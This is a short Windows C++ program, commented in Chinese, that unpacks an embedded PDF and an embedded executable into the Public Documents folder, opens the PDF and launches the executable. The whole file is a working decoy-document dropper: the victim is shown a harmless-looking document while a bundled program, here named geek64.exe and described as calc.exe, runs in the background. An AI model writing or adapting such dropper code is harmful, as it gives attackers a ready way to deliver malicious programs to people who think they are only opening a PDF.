#include <ShlObj.h>
#include <fstream>
#include "resource.h"

int main() {
    // 获取公共用户文件夹路径
    // 获取公共用户文件夹路径
    wchar_t publicPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_COMMON_DOCUMENTS, NULL, 0, publicPath) != S_OK) {
        return 1; // 获取失败
    }

    // 构建 PDF 文件的完整路径
    std::wstring pdfPath = publicPath;
    pdfPath += L"\\resources\\tabulary.pdf";

    // 构建 calc.exe 文件的完整路径
    std::wstring calcPath = publicPath;
    calcPath += L"\\resources\\geek64.exe";

    // 从资源中提取 PDF 数据
    HRSRC pdfResource = FindResourceW(NULL, MAKEINTRESOURCE(IDR_PDF1), L"PDF");
    if (pdfResource) {
        HGLOBAL pdfDataHandle = LoadResource(NULL, pdfResource);
        if (pdfDataHandle) {
            LPVOID pdfData = LockResource(pdfDataHandle);
            DWORD pdfSize = SizeofResource(NULL, pdfResource);

            // 保存 PDF 数据到文件
            std::ofstream outFile(pdfPath, std::ios::out | std::ios::binary);
            if (outFile) {
                outFile.write((const char*)pdfData, pdfSize);
                outFile.close();
            }
        }
    }

    // 从资源中提取 calc.exe 数据
    HRSRC calcResource = FindResourceW(NULL, MAKEINTRESOURCE(IDR_EXE1), L"EXE");
    if (calcResource) {
        HGLOBAL calcDataHandle = LoadResource(NULL, calcResource);
        if (calcDataHandle) {
            LPVOID calcData = LockResource(calcDataHandle);
            DWORD calcSize = SizeofResource(NULL, calcResource);

            // 保存 calc.exe 数据到文件
            std::ofstream outFile(calcPath, std::ios::out | std::ios::binary);
            if (outFile) {
                outFile.write((const char*)calcData, calcSize);
                outFile.close();
            }
        }
    }

    // 启动 PDF 文件
    ShellExecuteW(NULL, L"open", pdfPath.c_str(), NULL, NULL, SW_SHOWNORMAL);

    // 启动 calc.exe 文件
    ShellExecuteW(NULL, L"open", calcPath.c_str(), NULL, NULL, SW_SHOWNORMAL);

    return 0;
}
